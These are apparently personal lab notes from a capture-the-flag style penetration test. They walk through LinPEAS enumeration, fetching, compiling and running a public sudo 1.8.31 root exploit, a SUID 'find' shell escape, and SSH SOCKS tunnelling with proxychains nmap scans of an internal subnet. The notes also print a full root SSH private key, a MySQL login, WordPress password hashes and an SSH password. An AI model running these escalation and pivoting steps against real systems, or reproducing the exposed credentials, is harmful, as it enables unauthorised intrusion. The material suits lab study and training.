# LinPEAS

Upload and execute LinPEAS:
```
[...]
Sudo version 1.8.31
[...]
Vulnerable to CVE-2021-3560 => Polkit exploit
[...]
-rwsr-xr-x 1 root root 313K Feb 17  2020 /usr/bin/find
```

Exploit for sudo:
https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit

```bash
# Download on kali
git clone https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit.git
# Zip the git project in order to upload it to the target
zip -r exploit.zip Sudo-1.8.31-Root-Exploit
# Upload to target
scp exploit.zip balthazar@10.10.110.100:/home/balthazar/

# On target:
unzip exploit.zip
cd Sudo-1.8.31-Root-Exploit/
make
./exploit
```
=> root shell

```bash
cat /root/flag.txt
# DANTE{Too_much_Pr1v!!!!}
```

SSH private key:
```bash
cat .ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

SSH login as root:
```bash
# Save private key in file root.id_rsa
chmod 600 root.id_rsa
ssh root@10.10.110.100 -i root.id_rsa
# BWAM!
```

(Alternative) GTFObins find:
```bash
find . -exec /bin/sh -p \; -quit
```

---
# MySQL

Creds: `shaun:password`
```bash
mysql localhost -u shaun -p
# password
```

Enumeration:
```bash
show databases;
# +--------------------+
# | Database           |
# +--------------------+
# | information_schema |
# | mysql              |
# | performance_schema |
# | sys                |
# | wordpress          |
# +--------------------+

select * from wp_users;
# user_login | user_pass
# admin      | $P$BiINvM48wJ1iyfwOroCTdFhjB2qOvO.
# james      | $P$B/kdWnMDyh1oMT0QCG9YAyEu8Yt.M0.
```
=> hashcat cracking of admin pw hash was not successfull.

---
# Tunneling

Port forwarding to a dynamic remote host/port via local SOCKS server:
```bash
ssh -N -D localhost:1080 balthazar@10.10.110.100
# TheJoker12345!
```

Edit `/etc/proxychains4.conf` to point to the SSH socks proxy:
```conf
# Comment out the following option to not proxy DNS requests
# proxy_dns

# Time-out on non-responsive connections more quickly.
# This can dramatically speed up port-scanning times.
tcp_read_time_out 1200
tcp_connect_time_out 800

socks5 localhost 1080
# socks4 <socks-server-ip> <socks-server-port>
```

## Port Scan

Nmap via proxychains:
```bash
proxychains nmap -v -sT 172.16.1.0/24 -oN internal_hosts.txt
```
Very slow!

(Optional) Upload and execute static nmap binary `~/Hacking/tools/nmap-static-binaries/linux/x86_64/nmap`
```bash
./nmap -v -sn 172.16.1.0/24 -oN internal_hosts.nmap

172.16.1.1
172.16.1.5
172.16.1.10
172.16.1.12
172.16.1.13
172.16.1.17
172.16.1.19
172.16.1.20
172.16.1.100
172.16.1.101
172.16.1.102 # not reachable?
```
=> The nmap static binary has problems with scanning a host.

Nmap via proxychains:
```bash
sudo proxychains nmap -Pn -sT -p- -T4 -sV -sC -oN 172.16.1.10.nmap 172.16.1.10
```
=> super slow

Setup ligolo and make nmap scans => waaaay faster!
